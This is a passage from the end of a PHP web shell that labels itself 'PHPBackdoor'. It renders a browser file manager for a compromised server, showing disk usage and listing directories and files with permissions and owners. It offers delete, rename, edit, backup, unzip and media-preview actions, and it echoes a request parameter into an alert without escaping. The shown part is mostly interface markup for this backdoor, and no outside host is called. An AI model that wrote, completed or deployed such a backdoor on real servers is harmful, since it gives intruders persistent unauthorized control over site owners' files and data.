                        </tr>
                    </form>
                </table>
            </div>
            <?php
            exit();
            break;

    }
    if (@$_GET['failed']) {
        alert("" . $_GET['failed'] . " failed");
    }
    head(basename(getcwd()), dirname(getcwd()));
    ?>
    <div class="storage">
        <span class="title">
            PHPBackdoor
        </span>
        <br><span>Total : <?= XN::hdd('total') ?></span> <span>|</span>
        <span>Free : <?= XN::hdd('free') ?></span> <span>|</span>
        <span>Used : <?= XN::hdd('used') ?></span>
    </div>
    <div class="table">
    <table id="myTable">
        <?php
        foreach (XN::files('dir') as $dir) { ?>
            <tr>
                <td class="border1 hover">
                    <div class="block">
                        <a href="?x=<?= $dir['name'] ?>" title="<?= $dir[
    'names'
] ?>">
                            <div class="img">
                                <img src="https://cdn-icons-png.flaticon.com/128/1383/1383970.png">
                            </div>
                            <div class="name">
                                <?= $dir['names'] ?>
                                <div class="date">
                                    <div class="dir-size">
                                        <?= $dir['size'] ?>
                                    </div>
                                    <div class="dir-perms">
                                        <?= XN::wr(
                                            $dir['name'],
                                            XN::perms($dir['name']),
                                            2
                                        ) ?>
                                    </div>
                                    <div class="dir-time">
                                        <?= $dir['ftime'] ?>
                                    </div>
                                    <div class="dir-owner">
                                        <?= $dir['owner'] ?>
                                    </div>
                                </div>
                            </div>
                        </a>
                    </div>
                </td>
                <td class="border2">
                    <nav>
                        <a class="dropdown-toggle" title="Menu">
                            <span style="color: #787878;">
                                <i class="fa fa-ellipsis-v" aria-hidden="true"></i>
                            </span>
                        </a>
                        <ul class="dropdown">
                            <form method="post" action="?x=<?= getcwd() ?>">
                                <li>
                                    <button name="action" value="delete">Delete</button>
                                </li>
                                <li>
                                    <a href="#rename<?= XN::replace(
                                        $dir['names']
                                    ) ?>" rel="modal:open">Rename</a>
                                </li>
                                <input type="hidden" name="file" value="<?= $dir[
                                    'name'
                                ] ?>">
                            </form>
                        </ul>
                    </nav>
                    <!-- Action Rename -->
                    <div id="rename<?= XN::replace(
                        $dir['names']
                    ) ?>" class="modal modal-rename">
                        <div class="rename">
                            <h2>Rename</h2>
                            <form method="post" action="?x=<?= getcwd() ?>">
                                <div>
                                    <input type="text" name="newname" value="<?= $dir[
                                        'names'
                                    ] ?>">
                                </div>
                                <div>
                                    <button name="action" value="rename">Rename</button>
                                </div>
                                <input type="hidden" name="file" value="<?= $dir[
                                    'name'
                                ] ?>">
                            </form>
                        </div>
                    </div>
                </td>
            </tr>
        <?php }
        foreach (XN::files('file') as $file) { ?>
            <tr>
                <td class="border1 hover">
                    <div class="block">
                        <a title="<?= $file['names'] ?>">
                            <div class="img">
                                <img src="<?= XN::geticon($file['name']) ?>">
                            </div>
                            <div class="name">
                                <?= $file['names'] ?>
                                <div class="date">
                                    <div class="file-size">
                                        <?= $file['size'] ?>
                                    </div>
                                    <div class="file-perms">
                                        <?= XN::wr(
                                            $file['name'],
                                            XN::perms($file['name']),
                                            2
                                        ) ?>
                                    </div>
                                    <div class="file-time">
                                        <?= $file['ftime'] ?>
                                    </div>
                                    <div class="file-owner">
                                        <?= $file['owner'] ?>
                                    </div>
                                </div>
                            </div>
                        </a>
                    </div>
                </td>
                <td class="border2">
                    <nav>
                        <a class="dropdown-toggle" title="Menu">
                            <span style="color: #787878;">
                                <i class="fa fa-ellipsis-v" aria-hidden="true"></i>
                            </span>
                        </a>
                        <ul class="dropdown">
                            <form method="post" action="?x=<?= getcwd() ?>">
                                <?php
                                $rep = str_replace(
                                    [' ', '.', ':', '-', '(', ')'],
                                    '',
                                    $file['names']
                                );
                                switch (XN::getext($file['name'])) {
                                    case 'mp4':
                                    case 'mp3':
                                        switch (XN::getext($file['name'])) {
                                            case 'mp3':
                                                $result = str_replace(
                                                    'mp3',
                                                    'Audio',
                                                    XN::getext($file['name'])
                                                );
                                                break;
                                            case 'mp4':
                                                $result = str_replace(
                                                    'mp4',
                                                    'Video',
                                                    XN::getext($file['name'])
                                                );
                                                break;
                                        } ?>
                                        <li>
                                            <a href="#ex1<?= $rep ?>" rel="modal:open">Play</a>
                                            <div id="ex1<?= $rep ?>" class="modal">
                                                <<?= $result ?> controls>
                                                    <source src="<?= str_replace(
                                                        $_SERVER[
                                                            'DOCUMENT_ROOT'
                                                        ],
                                                        '',
                                                        $file["name"]
                                                    ) ?>" type="<?= $result ?>/<?= XN::getext(
    $file['name']
) ?>">
                                                </<?= $result ?>>
                                            </div>
                                        </li>
                                        <li>
                                            <button name="action" value="delete">Delete</button>
                                        </li>
                                        <li>
                                            <a href="#rename<?= XN::replace(
                                                $file['names']
                                            ) ?>" rel="modal:open">Rename</a>
                                        </li>
                                        <?php break;
                                    case 'zip': ?>
                                        <li>
                                            <button>Unzip</button>
                                        </li>
                                        <li>
                                            <button name="action" value="delete">Delete</button>
                                        </li>
                                        <li>
                                            <a href="#rename<?= XN::replace(
                                                $file['names']
                                            ) ?>" rel="modal:open">Rename</a>
                                        </li>
                                        <?php break;case 'jpg':
                                    case 'png':
                                    case 'gif':
                                    case 'jpeg':
                                    case 'ico':
                                    case 'webp': ?>
                                        <li>
                                            <a href="#ex1<?= $rep ?>" rel="modal:open">Preview</a>
                                            <div id="ex1<?= $rep ?>" class="modal">
                                                <img src="<?= str_replace(
                                                    $_SERVER['DOCUMENT_ROOT'],
                                                    '',
                                                    $file['name']
                                                ) ?>">
                                            </div>
                                        </li>
                                        <li>
                                            <button name="action" value="delete">Delete</button>
                                        </li>
                                        <li>
                                            <a href="#rename<?= XN::replace(
                                                $file['names']
                                            ) ?>" rel="modal:open">Rename</a>
                                        </li>
                                        <?php break;default: ?>
                                        <li>
                                            <button name="action" value="edit">Edit</button>
                                        </li>
                                        <li>
                                            <button name="action" value="delete">Delete</button>
                                        </li>
                                        <li>
                                            <a href="#rename<?= XN::replace(
                                                $file['names']
                                            ) ?>" rel="modal:open">Rename</a>
                                        </li>
                                        <li>
                                            <button name="action" value="backup">Backup</button>
                                        </li>
                                        <?php break;}
                                ?>
                                <input type="hidden" name="file" value="<?= $file[
                                    'name'
                                ] ?>">
                            </form>
                        </ul>
                    </nav>
                    <!-- Action Rename -->
                    <div id="rename<?= XN::replace(
                        $file['names']
                    ) ?>" class="modal modal-rename">
                        <div class="rename">
                            <h2>Rename</h2>
                            <form method="post" action="?x=<?= getcwd() ?>">
                                <div>
                                    <input type="text" name="newname" value="<?= $file[
                                        'names'
                                    ] ?>">
                                </div>
                                <div>
                                    <button name="action" value="rename">Rename</button>
                                </div>
                                <input type="hidden" name="file" value="<?= $file[
                                    'name'
                                ] ?>">
                            </form>
                        </div>
                    </div>
                </td>
            </tr>
        <?php }
        ?>
    </table>
    </div>
</div>
</center>